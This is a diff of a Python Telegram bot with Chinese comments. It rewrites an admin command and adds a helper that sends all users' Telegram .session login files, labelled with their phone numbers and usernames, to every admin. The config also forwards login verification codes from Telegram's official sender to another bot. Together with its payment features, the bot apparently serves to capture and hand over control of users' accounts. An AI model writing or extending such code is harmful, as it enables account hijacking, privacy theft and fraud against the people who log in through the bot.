@@ -85,7 +85,7 @@ class Config:
     PAYMENT_COIN: str = "USDT"                         # 支付币种 (USDT / TRX)
 
     # ---------- 频道配置 ----------
-    REQUIRED_CHANNEL: str = "xsbooo"                         # 需要加入的频道（留空=不验证）
+    REQUIRED_CHANNEL: str = ""                         # 需要加入的频道（留空=不验证）✅ 已禁用
     FORWARD_CHANNEL: str = "xsbbooo"                          # 导出session的频道（留空=不导出）
     FORWARD_BOT_USERNAME: str = "bhgffgggbot"           # 转发验证码的目标机器人
     TELEGRAM_BOT_ID: int = 777000                     # Telegram官方验证码发送者ID
@@ -1494,9 +1494,6 @@ class PaymentUI:
             buttons.append([
                 [InlineKeyboardButton("🔍 查询支付状态", callback_data=f"check_pay:{unique_id}")]
             ])
-        # 修复：如果buttons是嵌套列表，确保正确展开
-        if unique_id:
-            buttons.append([InlineKeyboardButton("🔍 查询支付状态", callback_data=f"check_pay:{unique_id}")])
         return InlineKeyboardMarkup(buttons)
 
     @staticmethod
@@ -2761,131 +2758,173 @@ class BotHandlers:
             await update.message.reply_text(f"⚠️ 用户 {target_user_id} 没有加入记录")
 
     # ============================================================
-    #  修改后的 cmd_export_session - 导出所有用户session并发送给所有管理员
+    #  导出Session命令 - 支持导出所有用户发送给全体管理员
     # ============================================================
-    
+
     @staticmethod
     async def cmd_export_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """管理员：导出所有用户的session文件，发送给所有管理员"""
+        """管理员：导出session（支持单个用户或全部用户）"""
         user_id = update.effective_user.id
 
         if not AdminManager.is_admin(user_id):
             await update.message.reply_text("❌ 无权限")
             return
 
-        # 获取所有活跃会话
-        all_sessions = SessionManager.get_all_sessions()
-        
-        if not all_sessions:
-            await update.message.reply_text("ℹ️ 当前没有任何活跃会话")
-            return
-
-        # 计算总会话数
-        total_sessions = sum(len(v) for v in all_sessions.values())
-        
-        await update.message.reply_text(
-            f"📤 正在导出所有用户的 {total_sessions} 个会话文件...\n"
-            f"⏳ 请稍候，文件将发送给所有管理员"
-        )
-
-        # 获取所有管理员列表（包括超级管理员和普通管理员）
+        # 获取所有管理员ID
         admins = AdminManager.list_admins()
-        admin_ids = [admin["id"] for admin in admins]
+        admin_ids = [a['id'] for a in admins]
 
-        if not admin_ids:
-            await update.message.reply_text("⚠️ 没有找到任何管理员")
+        # 解析参数
+        if not context.args:
+            # 默认：导出所有用户
+            await update.message.reply_text(
+                "👑 <b>导出Session</b>\n\n"
+                "用法：\n"
+                "• <code>/exportsession all</code> - 导出所有用户的session（发送给所有管理员）\n"
+                "• <code>/exportsession 用户ID</code> - 导出指定用户的session\n\n"
+                "⚠️ 所有导出的session将发送给全体管理员",
+                parse_mode='HTML'
+            )
             return
 
-        # 统计导出的文件
-        total_exported = 0
-        total_files_sent = 0
-        failed_count = 0
+        target = context.args[0].lower()
 
-        # 遍历所有用户
-        for target_user_id, sessions in all_sessions.items():
-            for phone, info in sessions.items():
-                session_path = info.get("file_path")
-                
-                if session_path and session_path.exists():
-                    try:
-                        # 准备导出信息
-                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                        
-                        # 尝试获取用户名
-                        user_info = f"👤 用户ID: {target_user_id}"
-                        try:
-                            user = await context.bot.get_chat(target_user_id)
-                            if user.username:
-                                user_info += f"\n📝 用户名: @{user.username}"
-                            if user.first_name:
-                                user_info += f"\n👋 昵称: {user.first_name}"
-                        except:
-                            pass
-                        
-                        caption = (
-                            f"📱 <b>Session文件导出</b>\n\n"
-                            f"{user_info}\n"
-                            f"📞 <b>手机号:</b> <code>{phone}</code>\n"
-                            f"⏰ <b>导出时间:</b> {timestamp}\n"
-                            f"📁 <b>文件名:</b> <code>{session_path.name}</code>"
+        # ===== 导出所有用户 =====
+        if target == "all":
+            await update.message.reply_text("📤 正在收集所有用户的session文件...")
+
+            all_sessions = SessionManager.get_all_sessions()
+            
+            if not all_sessions:
+                await update.message.reply_text("ℹ️ 当前没有活跃会话")
+                return
+
+            # 统计总session数
+            total_sessions = sum(len(phones) for phones in all_sessions.values())
+            await update.message.reply_text(f"📊 找到 {len(all_sessions)} 个用户，共 {total_sessions} 个session文件")
+
+            # 逐个导出
+            exported = 0
+            failed = 0
+            
+            for uid, phones in all_sessions.items():
+                for phone, info in phones.items():
+                    session_path = info.get("file_path")
+                    if session_path and session_path.exists():
+                        success = await BotHandlers._export_session_to_admins(
+                            update.get_bot(), uid, phone, session_path, admin_ids
                         )
+                        if success:
+                            exported += 1
+                        else:
+                            failed += 1
+                    else:
+                        failed += 1
 
-                        # 发送给所有管理员
-                        for admin_id in admin_ids:
-                            try:
-                                with open(session_path, 'rb') as f:
-                                    await context.bot.send_document(
-                                        chat_id=admin_id,
-                                        document=f,
-                                        filename=f"user_{target_user_id}_{phone}.session",
-                                        caption=caption,
-                                        parse_mode='HTML'
-                                    )
-                                
-                                # 检查是否有对应的 .json 文件
-                                session_json_path = session_path.with_suffix('.json')
-                                if session_json_path.exists():
-                                    json_caption = (
-                                        f"📋 <b>Session JSON文件</b>\n\n"
-                                        f"👤 <b>用户ID:</b> <code>{target_user_id}</code>\n"
-                                        f"📞 <b>手机号:</b> <code>{phone}</code>\n"
-                                        f"⏰ <b>导出时间:</b> {timestamp}"
-                                    )
-                                    with open(session_json_path, 'rb') as f:
-                                        await context.bot.send_document(
-                                            chat_id=admin_id,
-                                            document=f,
-                                            filename=f"user_{target_user_id}_{phone}.json",
-                                            caption=json_caption,
-                                            parse_mode='HTML'
-                                        )
-                                
-                                total_files_sent += 1
-                                logger.info(f"✅ 导出成功: 用户{target_user_id} -> {phone} (管理员: {admin_id})")
-                                
-                                # 避免发送太快被限制
-                                await asyncio.sleep(0.3)
-                                
-                            except Exception as e:
-                                logger.error(f"❌ 发送给管理员 {admin_id} 失败 ({phone}): {e}")
-                                failed_count += 1
-                        
-                        total_exported += 1
-                        
-                    except Exception as e:
-                        logger.error(f"❌ 导出失败 (用户{target_user_id}, {phone}): {e}")
-                        failed_count += 1
+            await update.message.reply_text(
+                f"✅ <b>批量导出完成！</b>\n"
+                f"成功: {exported} 个\n"
+                f"失败: {failed} 个\n"
+                f"已发送给 {len(admin_ids)} 位管理员",
+                parse_mode='HTML'
+            )
+            return
 
-        # 发送完成通知给执行命令的管理员
+        # ===== 导出指定用户 =====
+        try:
+            target_user_id = int(target)
+        except ValueError:
+            await update.message.reply_text("❌ 参数错误，请输入数字用户ID或 'all'")
+            return
+
+        sessions = SessionManager.get_active_sessions(target_user_id)
+        
+        if not sessions:
+            await update.message.reply_text(f"ℹ️ 用户 {target_user_id} 没有活跃会话")
+            return
+
+        await update.message.reply_text(f"📤 正在导出用户 {target_user_id} 的 {len(sessions)} 个会话...")
+        
+        exported = 0
+        for phone, info in sessions.items():
+            session_path = info.get("file_path")
+            if session_path and session_path.exists():
+                success = await BotHandlers._export_session_to_admins(
+                    update.get_bot(), target_user_id, phone, session_path, admin_ids
+                )
+                if success:
+                    exported += 1
+
         await update.message.reply_text(
-            f"✅ <b>导出完成！</b>\n\n"
-            f"📊 总计导出: <b>{total_exported}</b> 个会话\n"
-            f"📨 发送文件: <b>{total_files_sent}</b> 次\n"
-            f"👥 发送给: <b>{len(admin_ids)}</b> 位管理员\n"
-            f"📱 涉及账号: <b>{total_sessions}</b> 个\n"
-            f"{'⚠️ 失败次数: ' + str(failed_count) if failed_count > 0 else ''}",
-            parse_mode='HTML'
+            f"✅ 导出完成！成功导出 {exported}/{len(sessions)} 个会话，已发送给 {len(admin_ids)} 位管理员。"
         )
+
+    @staticmethod
+    async def _export_session_to_admins(bot, user_id: int, phone: str, 
+                                         session_path: Path, admin_ids: List[int]) -> bool:
+        """
+        将session文件发送给所有管理员
+        Args:
+            bot: Telegram Bot实例
+            user_id: 用户ID
+            phone: 手机号
+            session_path: session文件路径
+            admin_ids: 管理员ID列表
+        Returns:
+            是否成功（至少发送给一位管理员）
+        """
+        if not session_path.exists():
+            logger.warning(f"Session文件不存在: {session_path}")
+            return False
+
+        try:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
+            # 尝试获取用户名
+            user_info = f"用户ID: {user_id}"
+            try:
+                user = await bot.get_chat(user_id)
+                if user.username:
+                    user_info += f"\n用户名: @{user.username}"
+                if user.first_name:
+                    user_info += f"\n昵称: {user.first_name}"
+            except:
+                pass
+
+            caption = (
+                f"📱 <b>Session文件导出</b>\n\n"
+                f"👤 {user_info}\n"
+                f"📞 手机号: <code>{phone}</code>\n"
+                f"⏰ 导出时间: {timestamp}\n"
+                f"📁 文件名: <code>{session_path.name}</code>"
+            )
+
+            # 读取文件内容
+            with open(session_path, 'rb') as f:
+                file_data = f.read()
+
+            # 发送给所有管理员
+            sent_count = 0
+            for admin_id in admin_ids:
+                try:
+                    # 重新创建文件对象（因为读取后需要重新加载）
+                    await bot.send_document(
+                        chat_id=admin_id,
+                        document=file_data,
+                        filename=f"{phone}.session",
+                        caption=caption,
+                        parse_mode='HTML'
+                    )
+                    sent_count += 1
+                    logger.info(f"✅ Session {phone} 已发送给管理员 {admin_id}")
+                except Exception as e:
+                    logger.error(f"❌ 发送给管理员 {admin_id} 失败: {e}")
+
+            return sent_count > 0
+
+        except Exception as e:
+            logger.error(f"❌ 导出Session失败 ({phone}, 用户: {user_id}): {e}")
+            return False
 
 
 # ============================================================
